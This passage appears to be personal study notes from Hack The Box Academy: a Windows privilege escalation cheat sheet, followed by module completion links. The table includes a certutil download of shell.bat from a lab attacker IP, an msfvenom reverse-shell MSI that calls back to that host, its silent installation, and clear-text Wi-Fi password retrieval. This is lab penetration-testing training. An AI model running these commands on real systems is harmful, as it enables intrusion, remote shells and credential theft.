| `netsh wlan show profile ilfreight_corp key=clear`                                                                        | Retrieve saved wireless passwords                  |

**Other Commands**

| Command                                                                                                     | Description                                        |
| ----------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`                               | Transfer file with certutil                        |
| `certutil -encode file1 encodedfile`                                                                        | Encode file with certutil                          |
| `certutil -decode encodedfile file2`                                                                        | Decode file with certutil                          |
| `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`                                 | Query for always install elevated registry key (1) |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`                                              | Query for always install elevated registry key (2) |
| `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`                        | Generate a malicious MSI package                   |
| `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`                                     | Executing an MSI package from command line         |
| `schtasks /query /fo LIST /v`                                                                               | Enumerate scheduled tasks                          |
| `Get-ScheduledTask \| select TaskName,State`                                                                | Enumerate scheduled tasks with PowerShell          |
| `.\accesschk64.exe /accepteula -s -d C:\Scripts\`                                                           | Check permissions on a directory                   |
| `Get-LocalUser`                                                                                             | Check local user description field                 |
| `Get-WmiObject -Class Win32_OperatingSystem \| select Description`                                          | Enumerate computer description field               |
| `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmd`                                                           | Mount VMDK on Linux                                |
| `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`                                               | Mount VHD/VHDX on Linux                            |
| `sudo python2.7 windows-exploit-suggester.py --update`                                                      | Update Windows Exploit Suggester database          |
| `python2.7 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt` | Running Windows Exploit Suggester                  |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/path/15)

## Documentation and Reporting

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/162)

## Attacking Enterprise Networks

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/path/16)
